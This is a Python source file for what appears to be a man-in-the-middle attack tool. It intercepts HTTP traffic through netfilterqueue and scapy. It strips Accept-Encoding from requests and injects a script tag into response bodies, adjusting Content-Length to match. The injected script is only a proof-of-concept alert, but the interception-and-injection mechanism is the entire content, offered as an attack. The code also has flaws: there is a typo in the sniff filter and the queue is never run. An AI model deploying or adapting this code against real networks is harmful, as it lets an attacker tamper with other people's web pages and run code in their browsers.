from scapy.all import *
from colorama import init, Fore
import netfilterqueue
import re


init()

GREEN = Fore.GREEN
RESET = Fore.RESET



def sniff_packets(iface=None):
    if iface:
        sniff(filter-"port 80", prn=process_packet, iface=iface, store=False)

    else:
        sniff(filter="port 80", prn=process_packet, store=False)




def process_packet(packet):
   
    spacket = IP(packet.get_payload())
    if spacket[TCP].dport == 80:
        print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")

        try:
            load = spacket[Raw].load.decode()
        except Exception as e:
            packet.accept()
            return
        
        new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)

        spacket[Raw].load = new_load

        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None

        packet.set_payload(bytes(spacket))

    if spacket[TCP].sport == 80:
        print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")

        try:
            load = spacket[Raw].load.decode()
        except:
            packet.accept()
            return

        added_text = "<script>alert('Javascript Injected successfully!');</script>"

        added_text_length = len(added_text)

        load = load.replace("</body>", added_text + "</body>")

        if "Content-Length" in load:
            content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))

            new_content_length = content_length + added_text_length

            load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)

            if added_text in load:
                print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")

        
        spacket[Raw].load = load

        spacket[IP].len = None
        spacket[IP].chksum = None
        spacket[TCP].chksum = None

        packet.set_payload(bytes(spacket))
    
    packet.accept()

if __name__ == "__main__":

   queue = netfilterqueue.NetfilterQueue()

   queue.bind(0, process_packet)